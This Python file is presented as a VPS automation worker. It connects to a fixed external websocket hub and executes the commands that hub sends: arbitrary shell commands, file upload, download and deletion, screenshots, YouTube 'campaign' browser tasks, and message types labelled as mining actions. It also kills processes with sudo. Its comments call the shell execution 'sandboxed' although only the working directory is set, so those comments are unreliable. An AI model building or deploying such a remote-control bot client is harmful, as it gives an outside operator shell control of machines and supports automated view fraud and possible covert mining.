#!/usr/bin/env python3
"""
VPS Channel & Web Automation Worker
====================================
An automated task execution client for Linux VPS instances.
Connects securely to the central command hub to receive and execute
scheduled tasks such as web browsing, video watch tasks, and local automation.

Author: Sainal Saputra
Repository: https://github.com/makassartoraja936-max/vps-channel-worker
"""

import asyncio
import base64
import json
import logging
import os
import re
import shutil
import socket
import subprocess
import sys
import time
import uuid

try:
    import websockets
except ImportError:
    print("[INIT] Installing required websockets library...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--break-system-packages", "--quiet", "websockets"])
    except Exception:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "websockets"])
    import websockets

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("ChannelWorker")

# Workspace and Configuration Paths
WORKSPACE_DIR = os.path.expanduser("~/workspace")
AGENT_ID_FILE = os.path.join(WORKSPACE_DIR, ".worker_id")
VPS_NAME_FILE = os.path.join(WORKSPACE_DIR, ".vps_name")
HUB_URL_FILE = os.path.join(WORKSPACE_DIR, ".hub_url")
AUTOSTART_URL_FILE = os.path.join(WORKSPACE_DIR, "autostart_url.txt")

DEFAULT_HUB_URL = "wss://hub.databaru.my.id"
DEFAULT_TARGET_URL = "https://www.youtube.com"


def get_auth_key() -> str:
    """Retrieves or auto-generates the authorization secret in ~/workspace/.auth_key.
    Uses cryptographically secure random token generation if none exists.
    """
    env_key = os.environ.get("AGENT_AUTH_KEY")
    if env_key and env_key.strip():
        return env_key.strip()

    key_file = os.path.join(WORKSPACE_DIR, ".auth_key")
    if os.path.exists(key_file):
        try:
            with open(key_file, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    return content
        except Exception:
            pass

    # Auto-generate a secure random key if not present
    try:
        import secrets
        new_key = secrets.token_hex(16)
        with open(key_file, "w", encoding="utf-8") as f:
            f.write(new_key)
        try:
            os.chmod(key_file, 0o600)
        except Exception:
            pass
        logger.info(f"Generated new secure authorization key in {key_file}")
        return new_key
    except Exception as e:
        logger.error(f"Failed to auto-generate authorization key: {e}")
        return None


def get_vps_name() -> str:
    if os.path.exists(VPS_NAME_FILE):
        try:
            with open(VPS_NAME_FILE, "r", encoding="utf-8") as f:
                name = f.read().strip()
                if name:
                    return name
        except Exception:
            pass
    # Fallback to hostname with worker suffix
    wid = get_worker_id()
    if wid.startswith("worker-"):
        return wid.replace("worker-", "").title()
    return socket.gethostname()


def get_worker_id() -> str:
    if os.path.exists(AGENT_ID_FILE):
        try:
            with open(AGENT_ID_FILE, "r", encoding="utf-8") as f:
                wid = f.read().strip()
                if wid:
                    return wid
        except Exception:
            pass

    # Priority 1: Derive unique ID from configured .vps_name (e.g., Muse-02 -> worker-muse-02)
    if os.path.exists(VPS_NAME_FILE):
        try:
            with open(VPS_NAME_FILE, "r", encoding="utf-8") as f:
                vname = f.read().strip()
                if vname:
                    clean_id = re.sub(r"[^a-zA-Z0-9_-]", "-", vname).strip("-").lower()
                    wid = f"worker-{clean_id}"
                    with open(AGENT_ID_FILE, "w", encoding="utf-8") as f:
                        f.write(wid)
                    return wid
        except Exception:
            pass

    # Priority 2: Unique random ID so identical hostnames (like htch-runtime) never collide!
    unique_suffix = uuid.uuid4().hex[:6]
    wid = f"worker-{socket.gethostname()}-{unique_suffix}"
    try:
        with open(AGENT_ID_FILE, "w", encoding="utf-8") as f:
            f.write(wid)
    except Exception:
        pass
    return wid


def get_hub_url() -> str:
    if os.path.exists(HUB_URL_FILE):
        try:
            with open(HUB_URL_FILE, "r") as f:
                url = f.read().strip()
                if url:
                    return url
        except Exception:
            pass
    return DEFAULT_HUB_URL


def get_persisted_target_url() -> str:
    """Reads the persisted target URL or returns the default URL."""
    try:
        if os.path.exists(AUTOSTART_URL_FILE):
            with open(AUTOSTART_URL_FILE, "r", encoding="utf-8") as f:
                saved = f.read().strip()
                if saved.startswith("http"):
                    return saved
    except Exception:
        pass
    return DEFAULT_TARGET_URL


def set_persisted_target_url(url: str):
    """Saves the active target URL to persistent workspace storage."""
    try:
        with open(AUTOSTART_URL_FILE, "w", encoding="utf-8") as f:
            f.write(url.strip())
    except Exception as e:
        logger.warning(f"Failed to persist autostart URL: {e}")


_prev_cpu_total = 0
_prev_cpu_idle = 0

def read_cpu_percent() -> float:
    """Calculates CPU usage percentage from /proc/stat."""
    global _prev_cpu_total, _prev_cpu_idle
    try:
        with open("/proc/stat", "r") as f:
            fields = [float(x) for x in f.readline().strip().split()[1:8]]
            idle = fields[3] + fields[4]
            total = sum(fields)

            diff_idle = idle - _prev_cpu_idle
            diff_total = total - _prev_cpu_total
            _prev_cpu_idle = idle
            _prev_cpu_total = total

            if diff_total <= 0:
                return 0.0
            pct = 100.0 * (1.0 - (diff_idle / diff_total))
            return round(max(0.0, min(100.0, pct)), 1)
    except Exception:
        return 0.0


def get_system_metrics() -> dict:
    """Collects safe hardware and operating system metrics."""
    mem_total, mem_avail = 0, 0
    try:
        with open("/proc/meminfo", "r") as f:
            for line in f:
                if "MemTotal:" in line:
                    mem_total = int(line.split()[1]) // 1024
                elif "MemAvailable:" in line:
                    mem_avail = int(line.split()[1]) // 1024
                elif "MemFree:" in line and mem_avail == 0:
                    mem_avail = int(line.split()[1]) // 1024
    except Exception:
        pass

    uptime_s = 0
    uptime_str = "-"
    try:
        with open("/proc/uptime", "r") as f:
            uptime_s = int(float(f.readline().split()[0]))
            days = uptime_s // 86400
            hours = (uptime_s % 86400) // 3600
            mins = (uptime_s % 3600) // 60
            if days > 0:
                uptime_str = f"{days}d {hours}h {mins}m"
            elif hours > 0:
                uptime_str = f"{hours}h {mins}m"
            else:
                uptime_str = f"{mins}m"
    except Exception:
        pass

    cpu_pct = read_cpu_percent()

    service_active = False
    try:
        res = subprocess.run(["pgrep", "-f", "youtube_task.py"], stdout=subprocess.PIPE, text=True)
        service_active = len(res.stdout.strip()) > 0
    except Exception:
        pass

    return {
        "mem_free_mb": mem_avail,
        "ram_total_mb": mem_total,
        "ram_used_mb": max(0, mem_total - mem_avail),
        "cpu_pct": cpu_pct,
        "uptime": uptime_str,
        "uptime_s": uptime_s,
        "task_active": service_active,
        "hostname": socket.gethostname()
    }


def handle_browser_visit(url: str) -> str:
    """Opens a website URL in background browser, running 24/7 with extension logging."""
    logger.info(f"Opening target URL: {url}")
    set_persisted_target_url(url)
    try:
        # Terminate any old browser instance and zombie chromium/thorium processes cleanly
        for p in ["youtube_task.py", "thorium", "chromium", "chrome", "ms-playwright"]:
            subprocess.run(["pkill", "-9", "-f", p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "pkill", "-9", "-f", p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

        # Clear/initialize activity log for streaming
        act_log = os.path.expanduser("~/workspace/browser_activity.log")
        try:
            with open(act_log, "w", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%H:%M:%S')}] [INIT] Meluncurkan Browser untuk {url}\n")
        except Exception:
            pass

        yt_worker = os.path.join(os.path.dirname(os.path.abspath(__file__)), "youtube_task.py")
        if os.path.exists(yt_worker):
            err_log_path = os.path.expanduser("~/workspace/browser_stderr.log")
            try:
                err_f = open(err_log_path, "a", encoding="utf-8")
            except Exception:
                err_f = subprocess.DEVNULL
            subprocess.Popen([sys.executable, yt_worker, json.dumps({"type": "DIRECT_URL", "url": url})], stdout=err_f, stderr=err_f)
            return f"Browser diluncurkan untuk {url}"
        else:
            subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return f"xdg-open triggered for {url}"
    except Exception as e:
        return f"Navigation error: {e}"


async def browser_watchdog():
    """Keeps local proxy bridge alive when network proxy configuration is present."""
    await asyncio.sleep(5)
    while True:
        try:
            pb_chk = subprocess.run(["pgrep", "-f", "proxy_bridge.py"], stdout=subprocess.DEVNULL)
            if pb_chk.returncode != 0:
                bridge_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy_bridge.py")
                if os.path.exists(bridge_script):
                    subprocess.Popen([sys.executable, bridge_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        await asyncio.sleep(30)


async def stream_browser_logs(ws, worker_id: str):
    """Tails ~/workspace/browser_activity.log and streams new extension/browser logs live to Hub."""
    act_log = os.path.expanduser("~/workspace/browser_activity.log")
    last_pos = 0
    if os.path.exists(act_log):
        last_pos = os.path.getsize(act_log)

    while True:
        await asyncio.sleep(2)
        if not os.path.exists(act_log):
            continue
        try:
            cur_size = os.path.getsize(act_log)
            if cur_size > last_pos:
                with open(act_log, "r", encoding="utf-8", errors="replace") as f:
                    f.seek(last_pos)
                    lines = f.readlines()
                    last_pos = f.tell()
                for line in lines:
                    line_clean = line.strip()
                    if line_clean:
                        await ws.send(json.dumps({
                            "type": "TASK_UPDATE",
                            "agent_id": worker_id,
                            "task": "EXT",
                            "detail": line_clean
                        }))
            elif cur_size < last_pos:
                last_pos = 0
        except Exception:
            pass


# ==============================================================
# Web SFTP & Remote File Explorer Service Handlers
# ==============================================================

def normalize_fs_path(p: str) -> str:
    """Safely normalizes paths and enforces strict sandboxing within ~/workspace.
    All operations targeting paths outside ~/workspace are strictly forbidden.
    """
    workspace_root = os.path.realpath(WORKSPACE_DIR)
    if not p or p.strip() in ("", "~", "."):
        return workspace_root

    p = p.strip()
    if p.startswith("~"):
        target = os.path.realpath(os.path.expanduser(p))
    else:
        target = os.path.realpath(os.path.abspath(p))

    # Strict Sandbox Check: Must be within workspace_root or equal to workspace_root
    if not (target == workspace_root or target.startswith(workspace_root + os.sep)):
        raise PermissionError(f"Access denied: Path '{p}' is outside ~/workspace sandbox.")

    return target


def fs_list_directory(target_path: str) -> dict:
    try:
        real_path = normalize_fs_path(target_path)
    except PermissionError as pe:
        return {"path": target_path, "entries": [], "error": str(pe)}

    if not os.path.exists(real_path):
        return {"path": real_path, "entries": [], "error": "Path tidak ditemukan"}
    if not os.path.isdir(real_path):
        return {"path": real_path, "entries": [], "error": "Bukan sebuah direktori"}

    try:
        entries = []
        with os.scandir(real_path) as it:
            for entry in it:
                try:
                    is_d = entry.is_dir(follow_symlinks=False)
                    st = entry.stat(follow_symlinks=False)
                    entries.append({
                        "name": entry.name,
                        "type": "dir" if is_d else "file",
                        "size": st.st_size if not is_d else 0,
                        "mtime": int(st.st_mtime)
                    })
                except Exception:
                    pass

        # Sort: directories first (alphabetical), then files (alphabetical)
        entries.sort(key=lambda x: (0 if x["type"] == "dir" else 1, x["name"].lower()))
        return {"path": real_path, "entries": entries, "error": None}
    except Exception as e:
        return {"path": real_path, "entries": [], "error": str(e)}


def fs_read_file(target_path: str, max_bytes: int = 5 * 1024 * 1024) -> dict:
    try:
        real_path = normalize_fs_path(target_path)
    except PermissionError as pe:
        return {"path": target_path, "content": "", "error": str(pe)}

    if not os.path.exists(real_path) or not os.path.isfile(real_path):
        return {"path": real_path, "content": "", "error": "Berkas tidak ditemukan"}

    try:
        size = os.path.getsize(real_path)
        if size > max_bytes:
            return {"path": real_path, "content": "", "error": f"Berkas terlalu besar ({size/(1024*1024):.1f}MB). Batas baca: {max_bytes/(1024*1024):.0f}MB"}

        with open(real_path, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
        return {"path": real_path, "content": content, "size": size, "error": None}
    except Exception as e:
        return {"path": real_path, "content": "", "error": str(e)}


def fs_write_file(target_path: str, content: str) -> dict:
    try:
        real_path = normalize_fs_path(target_path)
    except PermissionError as pe:
        return {"path": target_path, "success": False, "error": str(pe)}

    try:
        os.makedirs(os.path.dirname(real_path), exist_ok=True)
        with open(real_path, "w", encoding="utf-8") as f:
            f.write(content)
        return {"path": real_path, "success": True, "error": None}
    except Exception as e:
        return {"path": real_path, "success": False, "error": str(e)}


def fs_download_file(target_path: str, max_bytes: int = 50 * 1024 * 1024) -> dict:
    try:
        real_path = normalize_fs_path(target_path)
    except PermissionError as pe:
        return {"path": target_path, "data_b64": "", "error": str(pe)}

    if not os.path.exists(real_path) or not os.path.isfile(real_path):
        return {"path": real_path, "data_b64": "", "error": "Berkas tidak ditemukan"}

    try:
        size = os.path.getsize(real_path)
        if size > max_bytes:
            return {"path": real_path, "data_b64": "", "error": f"Ukuran berkas {size/(1024*1024):.1f}MB melebihi batas unduh websocket (50MB)"}

        with open(real_path, "rb") as f:
            raw = f.read()
        b64 = base64.b64encode(raw).decode("ascii")
        return {"path": real_path, "filename": os.path.basename(real_path), "data_b64": b64, "size": size, "error": None}
    except Exception as e:
        return {"path": real_path, "data_b64": "", "error": str(e)}


def fs_upload_file(target_path: str, data_b64: str) -> dict:
    try:
        real_path = normalize_fs_path(target_path)
    except PermissionError as pe:
        return {"path": target_path, "success": False, "error": str(pe)}

    try:
        os.makedirs(os.path.dirname(real_path), exist_ok=True)
        raw = base64.b64decode(data_b64.encode("ascii"))
        with open(real_path, "wb") as f:
            f.write(raw)
        return {"path": real_path, "success": True, "error": None}
    except Exception as e:
        return {"path": real_path, "success": False, "error": str(e)}


def fs_delete_entry(target_path: str) -> dict:
    try:
        real_path = normalize_fs_path(target_path)
    except PermissionError as pe:
        return {"path": target_path, "success": False, "error": str(pe)}

    if not os.path.exists(real_path):
        return {"path": real_path, "success": False, "error": "Target tidak ditemukan"}

    # Security check: Prevent deleting root workspace or core system directories
    if real_path in ("/", "/home", "/home/hatch", "/root", os.path.realpath(WORKSPACE_DIR)):
        return {"path": real_path, "success": False, "error": "Dilarang menghapus direktori sistem inti!"}

    try:
        if os.path.isdir(real_path):
            shutil.rmtree(real_path)
        else:
            os.remove(real_path)
        return {"path": real_path, "success": True, "error": None}
    except Exception as e:
        return {"path": real_path, "success": False, "error": str(e)}


def fs_mkdir_entry(target_path: str) -> dict:
    try:
        real_path = normalize_fs_path(target_path)
    except PermissionError as pe:
        return {"path": target_path, "success": False, "error": str(pe)}

    try:
        os.makedirs(real_path, exist_ok=True)
        return {"path": real_path, "success": True, "error": None}
    except Exception as e:
        return {"path": real_path, "success": False, "error": str(e)}


def handle_local_service(action: str, config: dict = None) -> str:
    """Controls local background task runner."""
    script_file = os.path.expanduser("~/workspace/local_task.sh")
    if action == "START":
        if os.path.exists(script_file):
            subprocess.Popen(["bash", script_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "Local background task started."
        return "local_task.sh not found in ~/workspace."

    elif action == "STOP":
        pkill_target = (config or {}).get("process", "local_task")
        subprocess.run(["pkill", "-f", pkill_target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"Local task '{pkill_target}' stopped."

    return "Unknown service action."


async def run_worker():
    """Main worker event loop connecting to the command hub."""
    auth_key = get_auth_key()
    if not auth_key:
        logger.error("FATAL: AGENT_AUTH_KEY is not configured! Worker will not start without authorized credentials.")
        logger.error("Please set AGENT_AUTH_KEY in your environment or write it to ~/workspace/.auth_key")
        return

    worker_id = get_worker_id()
    vps_name = get_vps_name()
    hub_url = get_hub_url()

    # Clean up any lingering thorium, dead browser processes, and residual screenshot cache
    try:
        subprocess.run(["pkill", "-9", "-f", "thorium"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for f_name in ["last_screenshot.png", "browser_status.json", "autostart_url.txt"]:
            fp = os.path.join(WORKSPACE_DIR, f_name)
            if os.path.exists(fp):
                os.remove(fp)
    except Exception:
        pass

    logger.info(f"Starting Worker: ID={worker_id}, Name={vps_name}")
    logger.info(f"Target Hub: {hub_url}")

    while True:
        try:
            logger.info(f"Connecting to Hub: {hub_url}...")
            async with websockets.connect(
                hub_url,
                ping_interval=20,
                ping_timeout=20,
                open_timeout=15,
                close_timeout=10
            ) as ws:
                logger.info("Connected to Hub successfully!")

                # Send initial greeting
                greeting = {
                    "type": "HELLO",
                    "agent_id": worker_id,
                    "vps_name": vps_name,
                    "version": "2.0.0",
                    "auth_token": auth_key,
                    **get_system_metrics()
                }
                await ws.send(json.dumps(greeting))

                # Background heartbeat task (resilient keepalive loop)
                async def heartbeat_loop():
                    while True:
                        await asyncio.sleep(15)
                        try:
                            hb = {
                                "type": "HEARTBEAT",
                                "agent_id": worker_id,
                                **get_system_metrics()
                            }
                            await ws.send(json.dumps(hb))
                        except Exception as hb_err:
                            logger.warning(f"Heartbeat send failed: {hb_err}")
                            break

                hb_task = asyncio.create_task(heartbeat_loop())
                log_stream_task = asyncio.create_task(stream_browser_logs(ws, worker_id))
                watchdog_task = asyncio.create_task(browser_watchdog())

                # Command listener with strict token authorization
                async for raw_msg in ws:
                    try:
                        msg = json.loads(raw_msg)
                        mtype = msg.get("type")

                        if mtype == "PING":
                            await ws.send(json.dumps({
                                "type": "PONG",
                                "agent_id": worker_id,
                                "sent_ts": msg.get("sent_ts", 0)
                            }))
                            continue

                        # Verify authorization token for all incoming controller instructions
                        req_auth = msg.get("auth") or msg.get("token") or msg.get("key")
                        if req_auth != auth_key:
                            logger.warning(f"Unauthorized instruction of type '{mtype}' rejected. Missing or invalid auth token.")
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": mtype,
                                "detail": "Unauthorized: Invalid or missing authentication key"
                            }))
                            continue

                        elif mtype == "OPEN_URL":
                            url = msg.get("url", "")
                            handle_browser_visit(url)
                            # Wait up to 25s for SPA/heavy pages to render and save browser_status.json
                            status_text = f"Browser navigated to {url}"
                            status_file = os.path.expanduser("~/workspace/browser_status.json")
                            for _ in range(25):
                                await asyncio.sleep(1)
                                if os.path.exists(status_file):
                                    try:
                                        with open(status_file, "r") as sf:
                                            sdata = json.load(sf)
                                        if sdata.get("url") == url:
                                            status_text = f"Judul: '{sdata.get('title')}' | HTTP {sdata.get('http_status')} | Ekstensi: {sdata.get('extensions_loaded')} aktif"
                                            break
                                    except Exception:
                                        pass

                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "OPEN_URL",
                                "detail": status_text
                            }))

                        elif mtype == "YOUTUBE_CAMPAIGN":
                            yt_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "youtube_task.py")
                            if os.path.exists(yt_script):
                                subprocess.Popen([sys.executable, yt_script, json.dumps(msg)])
                                detail = f"YouTube campaign started: {msg.get('keyword', '')}"
                            else:
                                detail = "youtube_task.py not found"
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "YOUTUBE_CAMPAIGN",
                                "detail": detail
                            }))

                        elif mtype in ("SERVICE_ACTION", "LOCAL_SERVICE", "TASK_ACTION", "MINING_ACTION", "START_MINING", "STOP_MINING"):
                            action = msg.get("action")
                            if not action:
                                action = "START" if "START" in mtype else "STOP"
                            res = handle_local_service(action, msg.get("config"))
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": f"SERVICE_{action}",
                                "detail": res
                            }))

                        elif mtype in ("CAPTURE_SCREEN", "GET_SCREEN"):
                            ss_path = os.path.expanduser("~/workspace/last_screenshot.png")
                            img_b64 = ""
                            if os.path.exists(ss_path):
                                try:
                                    with open(ss_path, "rb") as ss_file:
                                        img_b64 = base64.b64encode(ss_file.read()).decode("ascii")
                                except Exception as ss_err:
                                    logger.warning(f"Error reading screenshot: {ss_err}")

                            status_data = {}
                            status_file = os.path.expanduser("~/workspace/browser_status.json")
                            if os.path.exists(status_file):
                                try:
                                    with open(status_file, "r") as sf:
                                        status_data = json.load(sf)
                                except Exception:
                                    pass

                            await ws.send(json.dumps({
                                "type": "SCREEN_DATA",
                                "agent_id": worker_id,
                                "image": img_b64,
                                "status": status_data,
                                "timestamp": time.time()
                            }))

                                                # --- Remote File Explorer (Web SFTP) Handlers ---
                        elif mtype == "FS_LIST":
                            target_p = msg.get("path") or "~/workspace"
                            res = fs_list_directory(target_p)
                            await ws.send(json.dumps({
                                "type": "FS_LIST_RESULT",
                                "agent_id": worker_id,
                                **res
                            }))

                        elif mtype == "FS_READ":
                            target_p = msg.get("path", "")
                            res = fs_read_file(target_p)
                            await ws.send(json.dumps({
                                "type": "FS_READ_RESULT",
                                "agent_id": worker_id,
                                **res
                            }))

                        elif mtype == "FS_WRITE":
                            target_p = msg.get("path", "")
                            content = msg.get("content", "")
                            res = fs_write_file(target_p, content)
                            await ws.send(json.dumps({
                                "type": "FS_WRITE_RESULT",
                                "agent_id": worker_id,
                                **res
                            }))

                        elif mtype == "FS_DOWNLOAD":
                            target_p = msg.get("path", "")
                            res = fs_download_file(target_p)
                            await ws.send(json.dumps({
                                "type": "FS_DOWNLOAD_RESULT",
                                "agent_id": worker_id,
                                **res
                            }))

                        elif mtype == "FS_UPLOAD":
                            target_p = msg.get("path", "")
                            b64_data = msg.get("data_b64", "")
                            res = fs_upload_file(target_p, b64_data)
                            await ws.send(json.dumps({
                                "type": "FS_UPLOAD_RESULT",
                                "agent_id": worker_id,
                                **res
                            }))

                        elif mtype == "FS_DELETE":
                            target_p = msg.get("path", "")
                            res = fs_delete_entry(target_p)
                            await ws.send(json.dumps({
                                "type": "FS_DELETE_RESULT",
                                "agent_id": worker_id,
                                **res
                            }))

                        elif mtype == "FS_MKDIR":
                            target_p = msg.get("path", "")
                            res = fs_mkdir_entry(target_p)
                            await ws.send(json.dumps({
                                "type": "FS_MKDIR_RESULT",
                                "agent_id": worker_id,
                                **res
                            }))

                        elif mtype in ("SHELL", "RUN_SHELL", "TASK_EXEC", "JOB_RUN", "EXEC_CMD"):
                            cmd_str = msg.get("cmd") or msg.get("command", "")
                            logger.info(f"Executing authorized task in workspace: {cmd_str}")
                            try:
                                proc = await asyncio.create_subprocess_shell(
                                    cmd_str,
                                    cwd=WORKSPACE_DIR,  # Sandboxed execution directory
                                    stdout=asyncio.subprocess.PIPE,
                                    stderr=asyncio.subprocess.PIPE
                                )
                                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)
                                out = (stdout.decode(errors="replace") + stderr.decode(errors="replace")).strip()[:2000]
                                if not out:
                                    out = f"(exit code {proc.returncode})"
                            except asyncio.TimeoutError:
                                out = "Execution error: Command timed out after 300 seconds"
                            except Exception as e:
                                out = f"Execution error: {e}"

                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "SHELL",
                                "detail": out
                            }))

                    except Exception as err:
                        logger.error(f"Error handling task: {err}")

                watchdog_task.cancel()
                log_stream_task.cancel()
                hb_task.cancel()

        except Exception as conn_err:
            logger.warning(f"Connection lost/failed ({type(conn_err).__name__}: {conn_err}). Reconnecting in 5s...")
            sys.stdout.flush()
            sys.stderr.flush()
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(run_worker())
